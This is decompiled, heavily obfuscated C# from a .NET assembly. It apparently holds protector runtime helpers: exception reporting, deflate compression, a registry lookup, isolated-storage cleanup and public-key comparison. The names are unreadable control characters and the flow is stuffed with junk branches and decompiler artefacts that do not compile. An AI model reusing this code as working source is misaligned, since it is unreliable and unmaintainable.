    static string \u0001() => \u0080\u0002.\u008F\u0003(\u0007.\u0004.\u0093(3412), \u0007.\u0004.\u0001());

    static void \u0001([In] Exception obj0, [In] object[] obj1)
    {
      if (false)
        return;
      if (obj0 != null && obj0 is SecurityException)
      {
        do
        {
          if (true)
          {
            if (true)
            {
              if (!\u001C.\u0012\u0002(\u0002.\u0004.\u0001, \u0007.\u0004.\u0093(442)) || !\u0007.\u0004.\u0001().\u0001((SecurityException) obj0))
                goto label_9;
            }
            else
              goto label_7;
          }
        }
        while (false);
        return;
      }
      goto label_9;
label_7:
      \u0007.\u0004.\u0001().\u0001(obj0, false, false);
      return;
label_9:
      \u0007.\u0004.\u0001(obj0, obj1);
      goto label_7;
    }

    static unsafe void \u0001([In] int obj0, [In] int obj1, [In] \u0008.\u0002.\u0007 obj2, [In] bool obj3, [In] byte[] obj4)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(24);
      short[] numArray1;
      try
      {
        (numArray1 = obj2.\u0001.\u0001)[256] = (short) ((int) numArray1[256] + 1);
        \u0007.\u0004.\u0001(obj2.\u0001);
        \u0007.\u0004.\u0001(obj2.\u0002);
        \u0008.\u0002.\u0007.\u0001 obj5 = obj2.\u0001;
        \u0007.\u0004.\u0001(obj2.\u0003, obj5);
        \u0008.\u0002.\u0007.\u0001 obj6 = obj2.\u0002;
        \u0007.\u0004.\u0001(obj2.\u0003, obj6);
        \u0007.\u0004.\u0001(obj2.\u0003);
        *(int*) voidPtr = 4;
        *(int*) ((IntPtr) voidPtr + 4) = 18;
        while (*(int*) ((IntPtr) voidPtr + 4) > *(int*) voidPtr)
        {
          if (obj2.\u0003.\u0001[\u0008.\u0002.\u0007.\u0001[*(int*) ((IntPtr) voidPtr + 4)]] > (byte) 0)
            *(int*) voidPtr = *(int*) ((IntPtr) voidPtr + 4) + 1;
          *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 4) - 1;
        }
        *(int*) ((IntPtr) voidPtr + 8) = 14 + *(int*) voidPtr * 3 + \u0007.\u0004.\u0001(obj2.\u0003) + \u0007.\u0004.\u0001(obj2.\u0001) + \u0007.\u0004.\u0001(obj2.\u0002) + obj2.\u0002;
        *(int*) ((IntPtr) voidPtr + 12) = obj2.\u0002;
        *(int*) ((IntPtr) voidPtr + 16) = 0;
        while (*(int*) ((IntPtr) voidPtr + 16) < 286)
        {
          *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) + (int) obj2.\u0001.\u0001[*(int*) ((IntPtr) voidPtr + 16)] * (int) \u0008.\u0002.\u0007.\u0003[*(int*) ((IntPtr) voidPtr + 16)];
          *(int*) ((IntPtr) voidPtr + 16) = *(int*) ((IntPtr) voidPtr + 16) + 1;
        }
        *(int*) ((IntPtr) voidPtr + 20) = 0;
        while (*(int*) ((IntPtr) voidPtr + 20) < 30)
        {
          *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) + (int) obj2.\u0002.\u0001[*(int*) ((IntPtr) voidPtr + 20)] * (int) \u0008.\u0002.\u0007.\u0004[*(int*) ((IntPtr) voidPtr + 20)];
          *(int*) ((IntPtr) voidPtr + 20) = *(int*) ((IntPtr) voidPtr + 20) + 1;
        }
        if (*(int*) ((IntPtr) voidPtr + 8) >= *(int*) ((IntPtr) voidPtr + 12))
          *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 12);
        if (obj0 >= 0 && obj1 + 4 < *(int*) ((IntPtr) voidPtr + 8) >> 3)
          \u0007.\u0004.\u0001(obj3, obj0, obj2, obj4, obj1);
        else if (*(int*) ((IntPtr) voidPtr + 8) == *(int*) ((IntPtr) voidPtr + 12))
        {
          \u0007.\u0004.\u0001(obj2.\u0001, 2 + (obj3 ? 1 : 0), 3);
          \u0008.\u0002.\u0007.\u0001 obj7 = obj2.\u0001;
          short[] numArray2 = \u0008.\u0002.\u0007.\u0002;
          byte[] numArray3 = \u0008.\u0002.\u0007.\u0003;
          \u0007.\u0004.\u0001(numArray2, obj7, numArray3);
          \u0008.\u0002.\u0007.\u0001 obj8 = obj2.\u0002;
          short[] numArray4 = \u0008.\u0002.\u0007.\u0003;
          byte[] numArray5 = \u0008.\u0002.\u0007.\u0004;
          \u0007.\u0004.\u0001(numArray4, obj8, numArray5);
          \u0007.\u0004.\u0001(obj2);
          \u0007.\u0004.\u0001(obj2);
        }
        else
        {
          \u0007.\u0004.\u0001(obj2.\u0001, 4 + (obj3 ? 1 : 0), 3);
          \u0007.\u0004.\u0001(*(int*) voidPtr, obj2);
          \u0007.\u0004.\u0001(obj2);
          \u0007.\u0004.\u0001(obj2);
        }
      }
      catch (Exception ex)
      {
        object[] objArray = new object[12]
        {
          (object) *(int*) voidPtr,
          (object) *(int*) ((IntPtr) voidPtr + 4),
          (object) *(int*) ((IntPtr) voidPtr + 8),
          (object) *(int*) ((IntPtr) voidPtr + 12),
          (object) *(int*) ((IntPtr) voidPtr + 16),
          (object) *(int*) ((IntPtr) voidPtr + 20),
          (object) numArray1,
          (object) obj2,
          (object) obj4,
          (object) obj0,
          (object) obj1,
          (object) obj3
        };
        \u0007.\u0004.\u0001(ex, objArray);
        throw;
      }
    }

    static int \u0001([In] \u0008.\u0002.\u000F obj0)
    {
      int num1;
      try
      {
        if (true)
        {
          int num2 = obj0.ReadByte();
          int num3;
          while (true)
          {
            int num4 = obj0.ReadByte();
            int num5;
            while (true)
            {
              num5 = num4 << 8;
              if (false)
                num4 = num5;
              else
                break;
            }
            num3 = num2 | num5;
            if (false)
              num2 = num3;
            else
              break;
          }
          num1 = num3;
        }
      }
      catch (Exception ex)
      {
        \u0008.\u0002.\u000F obj = obj0;
        \u0007.\u0004.\u0001(ex, (object) obj);
        throw;
      }
      return num1;
    }

    static void \u0001([In] \u0002.\u0004 obj0, [In] object obj1, [In] \u0001.\u0004 obj2)
    {
      \u0003.\u0006 obj = obj0.\u0001;
      if (obj == null)
        return;
      obj(obj1, obj2);
    }

    static unsafe int \u0001([In] \u0008.\u0002.\u0007.\u0001 obj0)
    {
      // ISSUE: untyped stack allocation
      IntPtr num = __untypedstackalloc(12);
      if (true)
        goto label_7;
label_1:
      void* voidPtr;
      try
      {
        *(int*) voidPtr = 0;
        *(int*) ((IntPtr) voidPtr + 4) = 0;
        while (*(int*) ((IntPtr) voidPtr + 4) < obj0.\u0001.Length)
        {
          *(int*) voidPtr = *(int*) voidPtr + (int) obj0.\u0001[*(int*) ((IntPtr) voidPtr + 4)] * (int) obj0.\u0001[*(int*) ((IntPtr) voidPtr + 4)];
          *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 4) + 1;
        }
        *(int*) ((IntPtr) voidPtr + 8) = *(int*) voidPtr;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) *(int*) voidPtr;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) *(int*) ((IntPtr) voidPtr + 4);
        \u0008.\u0002.\u0007.\u0001 obj = obj0;
        \u0007.\u0004.\u0001(ex, (object) local1, (object) local2, (object) obj);
        throw;
      }
      return *(int*) ((IntPtr) voidPtr + 8);
label_7:
      voidPtr = (void*) num;
      goto label_1;
    }

    static void \u0001(
      [In] Exception obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3,
      [In] object obj4,
      [In] object obj5,
      [In] object obj6,
      [In] object obj7,
      [In] object obj8,
      [In] object obj9)
    {
      \u0007.\u0004.\u0001(obj0, new object[9]
      {
        obj1,
        obj2,
        obj3,
        obj4,
        obj5,
        obj6,
        obj7,
        obj8,
        obj9
      });
    }

    static unsafe int \u0001([In] \u0008.\u0002.\u0008 obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(8);
      short num1;
      try
      {
        *(int*) voidPtr = (obj0.\u0001 << 5 ^ (int) obj0.\u0001[obj0.\u0005 + 2]) & (int) short.MaxValue;
        short[] numArray1 = obj0.\u0002;
        int index1 = obj0.\u0005 & (int) short.MaxValue;
        short[] numArray2 = obj0.\u0001;
        int index2 = *(int*) voidPtr;
        int num2;
        num1 = (short) (num2 = (int) numArray2[index2]);
        numArray1[index1] = (short) num2;
        obj0.\u0001[*(int*) voidPtr] = (short) obj0.\u0005;
        obj0.\u0001 = *(int*) voidPtr;
        *(int*) ((IntPtr) voidPtr + 4) = (int) num1 & (int) ushort.MaxValue;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<short> local1 = (ValueType) num1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) *(int*) voidPtr;
        \u0008.\u0002.\u0008 obj = obj0;
        \u0007.\u0004.\u0001(ex, (object) local1, (object) local2, (object) obj);
        throw;
      }
      return *(int*) ((IntPtr) voidPtr + 4);
    }

    static bool \u0001() => \u0007.\u0004.\u0001().\u0001 == (byte) 1;

    static bool \u0001()
    {
      bool flag;
      try
      {
        \u0002.\u0005.\u0002 obj;
        do
        {
          obj = new \u0002.\u0005.\u0002();
        }
        while (false);
        \u0007.\u0004.\u0001(ref obj);
        int num1 = (int) obj.\u0001;
        int num2;
        while (true)
        {
          num2 = num1 == 9 ? 1 : 0;
          if (false)
            num1 = num2;
          else if (false)
            num1 = num2;
          else
            break;
        }
        flag = num2 != 0;
      }
      catch
      {
        flag = false;
      }
      return flag;
    }

    static string \u0001()
    {
      string str1;
      try
      {
        RegistryKey registryKey = \u0084\u0002.\u007E\u0095\u0003((object) Registry.LocalMachine, \u0007.\u0004.\u0001());
        if (false)
          goto label_5;
        else
          goto label_6;
label_3:
        str1 = (string) null;
        goto label_10;
label_5:
        \u0011.\u007E\u001B((object) registryKey);
        string str2;
        str1 = str2;
        if (false)
          goto label_3;
        else
          goto label_10;
label_6:
        if (registryKey == null)
          registryKey = \u0084\u0002.\u007E\u0095\u0003((object) Registry.LocalMachine, \u0007.\u0004.\u0001());
        if (true)
        {
          if (registryKey != null)
          {
            str2 = (string) \u008B\u0002.\u007E\u009B\u0003((object) registryKey, \u0007.\u0004.\u0093(828), (object) null);
            goto label_5;
          }
          else
            goto label_3;
        }
        else
          goto label_5;
      }
      catch
      {
        do
        {
          str1 = (string) null;
        }
        while (false);
      }
label_10:
      return str1;
    }

    static void \u0001([In] \u0008.\u0002.\u0008 obj0)
    {
      try
      {
        obj0.\u0001 = (int) obj0.\u0001[obj0.\u0005] << 5 ^ (int) obj0.\u0001[obj0.\u0005 + 1];
      }
      catch (Exception ex)
      {
        \u0008.\u0002.\u0008 obj = obj0;
        \u0007.\u0004.\u0001(ex, (object) obj);
        throw;
      }
    }

    static void \u0001([In] \u0008.\u0005 obj0, [In] \u0001.\u0005 obj1, [In] string obj2, [In] string obj3)
    {
      \u0008.\u0006 obj4;
      try
      {
        do
        {
          obj4 = obj0.\u0001;
          if (obj4 == null)
            goto label_2;
        }
        while (false);
        goto label_3;
label_2:
        return;
label_3:
        obj4((object) obj0, new \u0007.\u0002(obj1, obj2, obj3));
      }
      catch (Exception ex)
      {
        \u0008.\u0006 obj5 = obj4;
        \u0008.\u0005 obj6 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<\u0001.\u0005> local = (System.Enum) obj1;
        string str1 = obj2;
        string str2 = obj3;
        \u0007.\u0004.\u0001(ex, (object) obj5, (object) obj6, (object) local, (object) str1, (object) str2);
        throw;
      }
    }

    static void \u0001([In] EventHandler obj0, [In] \u0002.\u0003 obj1)
    {
      EventHandler eventHandler1 = obj1.\u0001;
label_4:
      EventHandler comparand = eventHandler1;
      do
      {
        EventHandler eventHandler2 = (EventHandler) \u0083\u0002.\u0094\u0003((Delegate) comparand, (Delegate) obj0);
        EventHandler eventHandler3;
        if (true)
          eventHandler3 = eventHandler2;
        eventHandler1 = Interlocked.CompareExchange<EventHandler>(ref obj1.\u0001, eventHandler3, comparand);
        if (eventHandler1 != comparand)
          goto label_4;
      }
      while (false);
    }

    static void \u0001([In] string obj0)
    {
      \u0004.\u0004 obj1;
      try
      {
        do
        {
          obj1 = new \u0004.\u0004();
          \u0007.\u0004.\u0001((\u0008.\u0007) obj1, obj0);
        }
        while (false);
      }
      catch (Exception ex)
      {
        \u0004.\u0004 obj2 = obj1;
        string str = obj0;
        \u0007.\u0004.\u0001(ex, (object) obj2, (object) str);
        throw;
      }
    }

    static void \u0001([In] \u0008.\u0002.\u0008 obj0, [In] byte[] obj1)
    {
      try
      {
        do
        {
          obj0.\u0002 = obj1;
          obj0.\u0008 = 0;
          obj0.\u000E = obj1.Length;
        }
        while (false);
      }
      catch (Exception ex)
      {
        \u0008.\u0002.\u0008 obj = obj0;
        byte[] numArray = obj1;
        \u0007.\u0004.\u0001(ex, (object) obj, (object) numArray);
        throw;
      }
    }

    static void \u0001([In] string obj0)
    {
      try
      {
        try
        {
          do
          {
            if (true)
              \u008C\u0002.\u007E\u009C\u0003((object) \u0005.\u0006.\u0001, obj0);
          }
          while (false);
        }
        catch (IsolatedStorageException ex)
        {
        }
      }
      catch (Exception ex)
      {
        string str = obj0;
        \u0007.\u0004.\u0001(ex, (object) str);
        throw;
      }
    }

    static void \u0001([In] \u0008.\u0002.\u0003 obj0, [In] int obj1)
    {
      int num1;
      try
      {
        \u0008.\u0002.\u0003 obj2 = obj0;
        int num2;
        num1 = num2 = obj2.\u0002;
        obj2.\u0002 = num2 + 1;
        if (num1 == 32768)
          throw new InvalidOperationException();
        byte[] numArray = obj0.\u0001;
        \u0008.\u0002.\u0003 obj3 = obj0;
        int num3;
        num1 = num3 = obj3.\u0001;
        obj3.\u0001 = num3 + 1;
        int index = num1;
        int num4 = (int) (byte) obj1;
        numArray[index] = (byte) num4;
        obj0.\u0001 &= (int) short.MaxValue;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) num1;
        \u0008.\u0002.\u0003 obj = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) obj1;
        \u0007.\u0004.\u0001(ex, (object) local1, (object) obj, (object) local2);
        throw;
      }
    }

    static void \u0001()
    {
label_0:
      try
      {
        try
        {
          if (Environment.OSVersion.Platform != PlatformID.Win32NT)
            goto label_2;
label_1:
          if (true)
            MemoryManager.\u0001 = new MemoryManager();
          else
            goto label_0;
label_2:
          if (false)
            goto label_1;
        }
        catch
        {
        }
      }
      catch (Exception ex)
      {
        \u0007.\u0004.\u0001(ex);
        throw;
      }
    }

    static void \u0001()
    {
      string str1;
      string str2;
      string str3;
      string str4;
      int index;
      string[] strArray1;
      try
      {
        \u0007.\u0004.\u0001(\u0005.\u0006.\u0002);
        try
        {
          strArray1 = \u0086\u0002.\u007E\u0096\u0003((object) \u0005.\u0006.\u0001, \u0080\u0002.\u008F\u0003(\u0005.\u0006.\u0003, \u0007.\u0004.\u0093(2934)));
          for (index = 0; index < strArray1.Length; ++index)
          {
            str1 = strArray1[index];
            str2 = \u001A.\u000F\u0002(str1);
            str3 = \u0080\u0002.\u0090\u0003(\u0005.\u0006.\u0003, str1);
            \u0007.\u0004.\u0001(str3);
            str4 = \u0080\u0002.\u0090\u0003(\u0005.\u0006.\u0003, \u0080\u0002.\u008F\u0003(str2, \u0007.\u0004.\u0093(2943)));
            \u0007.\u0004.\u0001(str4);
          }
        }
        catch (DirectoryNotFoundException ex)
        {
        }
        try
        {
          \u008C\u0002.\u007E\u009D\u0003((object) \u0005.\u0006.\u0001, \u0005.\u0006.\u0003);
        }
        catch (IsolatedStorageException ex)
        {
        }
        \u008C\u0002.\u007E\u009E\u0003((object) \u0005.\u0006.\u0001, \u0005.\u0006.\u0003);
      }
      catch (Exception ex)
      {
        string str5 = str1;
        string str6 = str2;
        string str7 = str3;
        string str8 = str4;
        string[] strArray2 = strArray1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local = (ValueType) index;
        \u0007.\u0004.\u0001(ex, (object) str5, (object) str6, (object) str7, (object) str8, (object) strArray2, (object) local);
        throw;
      }
    }

    static void \u0001([In] \u0008.\u0002.\u0006 obj0, [In] byte[] obj1)
    {
      try
      {
        \u0007.\u0004.\u0001(obj0.\u0001, obj1);
      }
      catch (Exception ex)
      {
        \u0008.\u0002.\u0006 obj = obj0;
        byte[] numArray = obj1;
        \u0007.\u0004.\u0001(ex, (object) obj, (object) numArray);
        throw;
      }
    }

    static int \u0001([In] \u0008.\u0002.\u000E obj0)
    {
      int num;
      try
      {
        num = obj0.\u0003;
      }
      catch (Exception ex)
      {
        \u0008.\u0002.\u000E obj = obj0;
        \u0007.\u0004.\u0001(ex, (object) obj);
        throw;
      }
      return num;
    }

    [DllImport("kernel32.dll", EntryPoint = "IsWow64Process", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001(IntPtr _param0, out bool _param1);

    static int \u0001([In] \u0008.\u0002.\u000E obj0, [In] byte[] obj1, [In] int obj2, [In] int obj3)
    {
      int num1;
      try
      {
        if (obj0.\u0003 >= 8)
        {
          byte[] numArray = obj0.\u0001;
          \u0008.\u0002.\u000E obj = obj0;
          int num2;
          num1 = num2 = obj.\u0002;
          obj.\u0002 = num2 + 1;
          int index = num1;
          int num3 = (int) (byte) obj0.\u0001;
          numArray[index] = (byte) num3;
          obj0.\u0001 >>= 8;
          obj0.\u0003 -= 8;
        }
        if (obj3 <= obj0.\u0002 - obj0.\u0001)
        {
          Array.Copy((Array) obj0.\u0001, obj0.\u0001, (Array) obj1, obj2, obj3);
          obj0.\u0001 += obj3;
        }
        else
          goto label_5;
label_2:
        return obj3;
label_5:
        obj3 = obj0.\u0002 - obj0.\u0001;
        Array.Copy((Array) obj0.\u0001, obj0.\u0001, (Array) obj1, obj2, obj3);
        obj0.\u0001 = 0;
        obj0.\u0002 = 0;
        goto label_2;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) num1;
        \u0008.\u0002.\u000E obj = obj0;
        byte[] numArray = obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) obj3;
        \u0007.\u0004.\u0001(ex, (object) local1, (object) obj, (object) numArray, (object) local2, (object) local3);
        throw;
      }
    }

    static unsafe bool \u0001([In] Assembly obj0, [In] Assembly obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(5);
      byte[] numArray1;
      byte[] publicKey1;
      try
      {
        do
        {
          publicKey1 = obj1.GetName().GetPublicKey();
          byte[] publicKey2 = obj0.GetName().GetPublicKey();
          if (true)
            goto label_18;
label_3:
          int num1 = numArray1 == null ? 1 : 0;
          while (true)
          {
            int num2 = publicKey1 == null ? 1 : 0;
            if (num1 == num2)
            {
              if (numArray1 != null)
              {
                if (true)
                  *(int*) voidPtr = 0;
                int num3;
                while (true)
                {
                  num3 = *(int*) voidPtr;
                  if (true)
                  {
                    int num4 = numArray1.Length;
                    if (true)
                      num4 = num4;
                    if (num3 < num4)
                    {
                      if ((int) numArray1[*(int*) voidPtr] == (int) publicKey1[*(int*) voidPtr])
                        *(int*) voidPtr = *(int*) voidPtr + 1;
                      else
                        goto label_11;
                    }
                    else
                      goto label_17;
                  }
                  else
                    break;
                }
                num1 = num3;
              }
              else
                goto label_17;
            }
            else
              break;
          }
          continue;
label_18:
          numArray1 = publicKey2;
          goto label_3;
        }
        while (false);
        *(sbyte*) ((IntPtr) voidPtr + 4) = (sbyte) 0;
        goto label_20;
label_11:
        *(sbyte*) ((IntPtr) voidPtr + 4) = (sbyte) 0;
        goto label_20;
label_17:
        *(sbyte*) ((IntPtr) voidPtr + 4) = (sbyte) 1;
      }
      catch (Exception ex)
      {
        byte[] numArray2 = publicKey1;
        byte[] numArray3 = numArray1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local = (ValueType) *(int*) voidPtr;
        Assembly assembly1 = obj1;
        Assembly assembly2 = obj0;
        \u0007.\u0004.\u0001(ex, (object) numArray2, (object) numArray3, (object) local, (object) assembly1, (object) assembly2);
        throw;
      }
label_20:
      return (bool) *(sbyte*) ((IntPtr) voidPtr + 4);
    }

    static \u0008.\u0002.\u0004 \u0001([In] \u0008.\u0002.\u0005 obj0)
    {
      \u0008.\u0002.\u0004 obj1;
      byte[] destinationArray;
      try
      {
        byte[] numArray = new byte[obj0.\u0003];
        if (true)
          goto label_2;
label_1:
        if (true)
        {
          Array.Copy((Array) obj0.\u0002, obj0.\u0002, (Array) destinationArray, 0, obj0.\u0003);
          if (true)
          {
            obj1 = new \u0008.\u0002.\u0004(destinationArray);
            goto label_6;
          }
          else
            goto label_6;
        }
        else
          goto label_6;
label_2:
        destinationArray = numArray;
        goto label_1;
      }
      catch (Exception ex)
      {
        byte[] numArray = destinationArray;
        \u0008.\u0002.\u0005 obj2 = obj0;
        \u0007.\u0004.\u0001(ex, (object) numArray, (object) obj2);
        throw;
      }
label_6:
      return obj1;
    }

    static void \u0001([In] \u0008.\u0007 obj0, [In] string obj1)
    {
      object obj2;
      try
      {
        try
        {
          \u001D\u0002.\u0089\u0003(obj2 = \u0008.\u0007.\u0001);
          try
          {
            \u0007.\u0004.\u0001(obj0);
            \u0007.\u0004.\u0001(obj1);
          }
          finally
          {
            do
            {
              \u001D\u0002.\u008A\u0003(obj2);
            }
            while (false);
          }
        }
        catch
        {
        }
      }
      catch (Exception ex)
      {
        object obj3 = obj2;
        \u0008.\u0007 obj4 = obj0;
        string str = obj1;
        \u0007.\u0004.\u0001(ex, obj3, (object) obj4, (object) str);
        throw;
      }
    }

    static unsafe bool \u0001([In] bool obj0, [In] bool obj1, [In] \u0008.\u0002.\u0008 obj2)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(2);
      bool flag;
      try
      {
        do
        {
          \u0007.\u0004.\u0001(obj2);
          flag = obj0 && obj2.\u0008 == obj2.\u000E;
          *(sbyte*) voidPtr = (sbyte) \u0007.\u0004.\u0001(flag, obj1, obj2);
        }
        while (\u0007.\u0004.\u0001(obj2.\u0001) && *(sbyte*) voidPtr != (sbyte) 0);
        *(sbyte*) ((IntPtr) voidPtr + 1) = *(sbyte*) voidPtr;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<bool> local1 = (ValueType) (bool) *(sbyte*) voidPtr;
        // ISSUE: variable of a boxed type
        __Boxed<bool> local2 = (ValueType) flag;
        \u0008.\u0002.\u0008 obj = obj2;
        // ISSUE: variable of a boxed type
        __Boxed<bool> local3 = (ValueType) obj0;
        // ISSUE: variable of a boxed type
        __Boxed<bool> local4 = (ValueType) obj1;
        \u0007.\u0004.\u0001(ex, (object) local1, (object) local2, (object) obj, (object) local3, (object) local4);
        throw;
      }
      return (bool) *(sbyte*) ((IntPtr) voidPtr + 1);
    }

    static void \u0001([In] \u0008.\u0005 obj0, [In] \u0001.\u0005 obj1)
    {
      try
      {
        if (false)
          return;
        \u0007.\u0004.\u0001(obj1, string.Empty, obj0);
      }
      catch (Exception ex)
      {
        \u0008.\u0005 obj = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<\u0001.\u0005> local = (System.Enum) obj1;
        \u0007.\u0004.\u0001(ex, (object) obj, (object) local);
        throw;
      }
    }

    static void \u0001([In] \u0008.\u0002.\u0007 obj0)
    {
      try
      {
        do
        {
          if (true)
            goto label_2;
label_1:
          continue;
label_2:
          obj0.\u0001 = 0;
          goto label_1;
        }
        while (false);
        obj0.\u0002 = 0;
      }
      catch (Exception ex)
      {
        \u0008.\u0002.\u0007 obj = obj0;
        \u0007.\u0004.\u0001(ex, (object) obj);
        throw;
      }
    }

    static \u0002.\u0004 \u0001()
    {
      Type[] typeArray;
      if (true)
      {
        if (\u0002.\u0004.\u0001 == null)
          typeArray = \u008D\u0002.\u007E\u0002\u0004((object) global::\u0001.\u0001());
        else
          goto label_15;
      }
      else
        goto label_18;
label_3:
      int num = 0;
      int index;
      if (num == 0)
      {
        index = num;
        goto label_12;
      }
      else
        goto label_13;
label_9:
      ++num;
label_10:
      if (true)
        index = num;
      else
        goto label_9;
label_12:
      num = index;
label_13:
      Type type;
      if (true)
      {
        if (num < typeArray.Length)
        {
          type = typeArray[index];
          goto label_18;
        }
      }
      else
        goto label_10;
label_15:
      return \u0002.\u0004.\u0001;
label_18:
      if ((object) type != null && (object) \u0082.\u007E\u001E\u0002((object) type) != null)
      {
        // ISSUE: type reference
        if ((object) \u0082.\u007E\u001E\u0002((object) type) == (object) \u0012.\u0083(__typeref (\u0002.\u0004)))
        {
          try
          {
            \u0002.\u0004.\u0001 = (\u0002.\u0004) \u008E\u0002.\u0003\u0004(type, true);
            if (\u0002.\u0004.\u0001 != null)
              goto label_15;
          }
          catch
          {
          }
        }
      }
      if (true)
      {
        num = index;
        goto label_9;
      }
      else
        goto label_3;
    }

    static unsafe int \u0001([In] \u0008.\u0002.\u0002 obj0, [In] byte[] obj1, [In] int obj2, [In] int obj3)
    {
      // ISSUE: untyped stack allocation
      IntPtr num1 = __untypedstackalloc(12);
      if (true)
        goto label_20;
label_1:
      void* voidPtr;
      int num2;
      try
      {
        *(int*) voidPtr = 0;
label_3:
        int num3 = obj0.\u0003;
        int num4;
        for (int index = 0; num3 > index && obj3 > 0; num3 = num4)
        {
          obj1[obj2++] = (byte) obj0.\u0001;
          obj0.\u0001 >>= 8;
          obj0.\u0003 -= 8;
          num4 = obj3;
          int num5 = 1;
          if (num5 != 0)
          {
            int num6 = num4 - num5;
            if (true)
              obj3 = num6;
            *(int*) voidPtr = *(int*) voidPtr + 1;
            goto label_3;
          }
          else
            index = num5;
        }
        if (obj3 == 0)
        {
          *(int*) ((IntPtr) voidPtr + 8) = *(int*) voidPtr;
        }
        else
        {
          *(int*) ((IntPtr) voidPtr + 4) = obj0.\u0002 - obj0.\u0001;
          if (obj3 > *(int*) ((IntPtr) voidPtr + 4))
          {
            if (true)
              obj3 = *(int*) ((IntPtr) voidPtr + 4);
            else
              goto label_12;
          }
          Array.Copy((Array) obj0.\u0001, obj0.\u0001, (Array) obj1, obj2, obj3);
          if (true)
            obj0.\u0001 += obj3;
          else
            goto label_19;
label_12:
          if ((obj0.\u0001 - obj0.\u0002 & 1) != 0)
          {
            \u0008.\u0002.\u0002 obj = obj0;
            byte[] numArray = obj0.\u0001;
            num2 = obj0.\u0001++;
            int index = num2;
            int num7 = (int) numArray[index] & (int) byte.MaxValue;
            obj.\u0001 = (uint) num7;
            obj0.\u0003 = 8;
          }
          *(int*) ((IntPtr) voidPtr + 8) = *(int*) voidPtr + obj3;
        }
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) *(int*) voidPtr;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) *(int*) ((IntPtr) voidPtr + 4);
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) num2;
        \u0008.\u0002.\u0002 obj = obj0;
        byte[] numArray = obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local4 = (ValueType) obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> local5 = (ValueType) obj3;
        \u0007.\u0004.\u0001(ex, (object) local1, (object) local2, (object) local3, (object) obj, (object) numArray, (object) local4, (object) local5);
        throw;
      }
label_19:
      return *(int*) ((IntPtr) voidPtr + 8);
label_20:
      voidPtr = (void*) num1;
      goto label_1;
    }

    static void \u0001([In] \u0008.\u0005.\u0001 obj0, [In] string obj1)
    {
      byte[] numArray1;
      byte[] numArray2;
      \u0008.\u0005.\u0002 obj2;
      string str1;
      try
      {
        if (!\u001C.\u0012\u0002(obj1, \u0007.\u0004.\u0093(3327)))
        {
          str1 = obj1;
          if (obj0.\u0001.\u0001 != null)
            obj0.\u0001.\u0001((object) obj0, new \u0007.\u0002(\u0001.\u0005.\u0002, str1));
          obj0.\u0001 = false;
        }
        else
        {
          \u0007.\u0004.\u0001(obj0.\u0001, \u0001.\u0005.\u0003);
          numArray1 = \u0089\u0002.\u007E\u0099\u0003((object) \u0018.\u0006\u0002(), \u0007.\u0004.\u0093(757));
          numArray2 = new byte[numArray1.Length + obj0.\u0001.Length];
          \u008A\u0002.\u009A\u0003((Array) numArray1, (Array) numArray2, numArray1.Length);
          \u001F\u0002.\u008D\u0003((Array) obj0.\u0001, 0, (Array) numArray2, numArray1.Length, obj0.\u0001.Length);
          obj2 = new \u0008.\u0005.\u0002(obj0.\u0001);
          do
          {
            \u0007.\u0003 obj3 = obj0.\u0001;
            string str2 = \u0007.\u0004.\u0001(obj0.\u0001);
            string str3 = \u0007.\u0004.\u0001(obj0.\u0001);
            string str4 = \u0007.\u0004.\u0001(obj0.\u0001);
            \u0001.\u0006 obj4 = new \u0001.\u0006(((\u0007.\u0004) obj2).\u0001);
            \u0007.\u0004.\u0001(str3, numArray2, obj3, str4, str2, obj4);
          }
          while (false);
          obj0.\u0001 = obj2.\u0001;
        }
      }
      catch (Exception ex)
      {
        byte[] numArray3 = numArray1;
        byte[] numArray4 = numArray2;
        \u0008.\u0005.\u0002 obj5 = obj2;
        string str5 = str1;
        \u0008.\u0005.\u0001 obj6 = obj0;
        string str6 = obj1;
        \u0007.\u0004.\u0001(ex, (object) numArray3, (object) numArray4, (object) obj5, (object) str5, (object) obj6, (object) str6);
        throw;
      }
    }

    static void \u0001(
      [In] Exception obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3,
      [In] object obj4,
      [In] object obj5,
      [In] object obj6)
    {
      \u0007.\u0004.\u0001(obj0, new object[6]
      {
        obj1,
        obj2,
        obj3,
        obj4,
        obj5,
        obj6
      });
    }

